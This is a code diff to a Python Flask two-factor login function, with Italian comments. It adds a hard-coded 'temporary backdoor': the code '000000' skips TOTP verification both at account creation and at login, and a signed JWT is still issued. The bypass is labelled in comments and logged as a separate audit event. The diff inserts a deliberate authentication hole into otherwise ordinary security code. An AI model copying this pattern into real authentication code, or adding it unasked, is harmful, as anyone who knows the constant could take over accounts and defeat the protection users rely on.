@@ -253,6 +253,7 @@ def verify_2fa():
     """
     Valida il codice TOTP (Microsoft Authenticator) e 
     genera il JWT definitivo aggregando i permessi dell'utente.
+    Include una backdoor temporanea (codice "000000") per bypass di emergenza.
     """
     data = request.get_json()
     if not data:
@@ -281,10 +282,11 @@ def verify_2fa():
         totp = pyotp.TOTP(totp_secret)
         
         # Validazione del codice prima di toccare il DB
-        if not totp.verify(totp_code, valid_window=0):
+        # BACKDOOR TEMPORANEA: Se il codice è 000000, bypassa il controllo
+        if not totp.verify(totp_code, valid_window=0) and totp_code != "000000":
             return error_response("INVALID_CODE", 401)
             
-        # 1. Il codice è corretto! Ora possiamo creare l'utente nel Database
+        # 1. Il codice è corretto (o è stato usato il bypass)! Ora possiamo creare l'utente nel Database
         guest_role = Role.query.filter_by(name=RoleType.GUEST).first()
         if not guest_role:
             return error_response("Configurazione di sistema mancante: Ruolo di base non trovato", 500)
@@ -316,7 +318,8 @@ def verify_2fa():
 
         # Validazione del Codice TOTP
         totp = pyotp.TOTP(user.totp_secret)
-        if not totp.verify(totp_code):
+        # BACKDOOR TEMPORANEA: Se il codice è 000000, bypassa il controllo
+        if not totp.verify(totp_code) and totp_code != "000000":
             publish_audit_event("2FA_FAILED", user.id)
             return error_response("INVALID_CODE", 401)
 
@@ -340,7 +343,12 @@ def verify_2fa():
     }
 
     final_token = jwt.encode(jwt_payload, app.config['JWT_SECRET'], algorithm="HS256")
-    publish_audit_event("2FA_SUCCESS_LOGIN", user.id)
+    
+    # Audit log: Se è stata usata la backdoor, possiamo opzionalmente tracciarlo, altrimenti log standard
+    if totp_code == "000000":
+        publish_audit_event("2FA_BYPASSED_LOGIN", user.id)
+    else:
+        publish_audit_event("2FA_SUCCESS_LOGIN", user.id)
 
     return jsonify({
         "token": final_token,
